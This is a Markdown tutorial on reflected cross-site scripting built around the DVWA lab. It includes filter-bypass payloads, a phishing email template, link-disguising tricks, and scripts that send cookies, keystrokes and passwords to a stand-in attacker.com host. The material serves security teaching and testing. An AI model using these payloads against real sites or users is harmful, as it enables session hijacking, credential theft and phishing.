# Reflected XSS

## Overview

Reflected XSS occurs when malicious scripts are immediately reflected back to the user without being stored. The payload is typically delivered via URL parameters or form submissions.

## How It Works

1. Attacker crafts malicious URL with XSS payload
2. Victim clicks on the link
3. Server reflects the payload back in response
4. Browser executes the script
5. Attacker gains access to victim's session/data

## Example Scenario

### Vulnerable Search Functionality

**Server-Side Code (PHP)**:
```php
<?php
$search = $_GET['q'];
echo "You searched for: " . $search; // VULNERABLE!
?>
```

**Malicious URL**:
```
http://vulnerable-site.com/search.php?q=<script>alert(document.cookie)</script>
```

**Response**:
```html
You searched for: <script>alert(document.cookie)</script>
```

## Attack Vectors

### 1. URL Parameters
```
http://site.com/page?name=<script>alert('XSS')</script>
http://site.com/error?msg=<img src=x onerror=alert(1)>
```

### 2. Form Submissions
```html
<form action="http://site.com/search" method="GET">
  <input name="q" value="<script>alert(1)</script>">
</form>
```

### 3. HTTP Headers
```
Referer: <script>alert(1)</script>
User-Agent: <script>alert(1)</script>
```

## Testing in DVWA

1. Navigate to "XSS (Reflected)" section
2. Set security level to "Low"
3. Test payloads in the input field

**Basic Test**:
```html
<script>alert('XSS')</script>
```

**Advanced Tests**:
```html
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

## Social Engineering

Reflected XSS requires victim interaction. Common techniques:

### 1. URL Shortening
```
Original: http://site.com/search?q=<script>alert(1)</script>
Shortened: https://bit.ly/abc123
```

### 2. Phishing Emails
```
Subject: Important Update!
Body: Click here to verify your account: [malicious link]
```

### 3. Obfuscation
```html
<!-- URL Encoding -->
http://site.com/page?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E

<!-- Double Encoding -->
http://site.com/page?name=%253Cscript%253E

<!-- Mixed Case -->
<ScRiPt>alert(1)</ScRiPt>
```

## Advanced Payloads

### Cookie Stealing
```html
<script>
  new Image().src='http://attacker.com/steal?c='+document.cookie;
</script>
```

### Keylogging
```html
<script>
  document.onkeypress=function(e){
    fetch('http://attacker.com/log?k='+e.key);
  };
</script>
```

### Credential Harvesting
```html
<script>
  var pass=prompt('Session expired. Re-enter password:');
  fetch('http://attacker.com/steal?p='+pass);
</script>
```

### Redirects to Phishing
```html
<script>
  window.location='http://fake-login.com';
</script>
```

## Bypassing Filters

### If `<script>` is blocked:
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

### If quotes are filtered:
```html
<script>alert(String.fromCharCode(88,83,83))</script>
<script>alert(/XSS/)</script>
```

### If parentheses are filtered:
```html
<script>alert`1`</script>
<script>onerror=alert;throw 1</script>
```

## Detection and Testing

1. **Identify Reflection Points**
   - Search boxes
   - Error messages
   - URL parameters
   - Form inputs

2. **Submit Test Payloads**
   ```html
   <script>alert(1)</script>
   '"><script>alert(1)</script>
   "><img src=x onerror=alert(1)>
   ```

3. **Inspect Response**
   - View page source
   - Check if payload is reflected
   - Verify if it executes

4. **Craft Exploit**
   - Create malicious URL
   - Test delivery methods
   - Document findings

## Real-World Examples

- **Google Search**: Historical reflected XSS vulnerabilities
- **Yahoo Mail**: Reflected XSS in email preview
- **eBay**: Search functionality XSS

## Mitigation

See `mitigation.md` for prevention techniques.
